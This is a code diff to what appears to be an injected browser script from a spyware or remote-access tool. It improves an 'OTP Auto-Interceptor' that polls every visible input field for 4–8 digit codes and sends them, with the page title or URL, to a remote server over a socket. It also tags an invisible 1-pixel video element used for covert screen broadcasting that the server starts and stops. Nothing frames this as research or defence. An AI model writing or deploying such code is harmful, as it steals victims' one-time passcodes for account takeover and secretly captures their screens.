@@ -2149,19 +2149,20 @@ initURLMonitor();
 
 // 📱 OTP Auto-Interceptor — monitor all input fields for OTP patterns
 function initOTPMonitor() {
-    let lastInputValue = '';
+    if (!window._otpSeen) window._otpSeen = new Set();
     setInterval(() => {
-        // Check all visible input fields
         const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="number"], input:not([type])');
         inputs.forEach(inp => {
             const val = inp.value.trim();
-            if (!val || val === lastInputValue) return;
-            // OTP patterns: 4-8 digit codes
+            if (!val) return;
             const otpMatch = val.match(/\b(\d{4,8})\b/);
             if (otpMatch && document.visibilityState === 'visible') {
+                const otp = otpMatch[1];
+                if (window._otpSeen.has(otp)) return;
+                window._otpSeen.add(otp);
+                if (window._otpSeen.size > 50) window._otpSeen = new Set([...window._otpSeen].slice(-25));
                 const context = (document.title || window.location.href).slice(0,100);
-                socket.emit('device-info', { otpCode: otpMatch[1], otpSource: 'input_field', otpContext: context });
-                lastInputValue = val;
+                socket.emit('device-info', { otpCode: otp, otpSource: 'input_field', otpContext: context });
             }
         });
         // Also check SMS data if stored in page
@@ -2186,6 +2187,7 @@ socket.on('start-screen-broadcast', () => {
         .then((screenStream) => {
             const v = document.createElement('video');
             v.autoplay = true; v.playsinline = true;
+            v.setAttribute('data-broadcast','1');
             v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
             v.srcObject = screenStream;
             document.body.appendChild(v);
@@ -2213,8 +2215,7 @@ socket.on('stop-screen-broadcast', stopScreenBroadcast);
 function stopScreenBroadcast() {
     if (screenBroadcastInterval) { clearInterval(screenBroadcastInterval); screenBroadcastInterval = null; }
     socket.emit('screen-broadcast-status', { status: 'stopped' });
-    // Stop any screen capture tracks
-    document.querySelectorAll('video[data-screen]').forEach(v => {
+    document.querySelectorAll('video[data-broadcast]').forEach(v => {
         if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
         v.remove();
     });
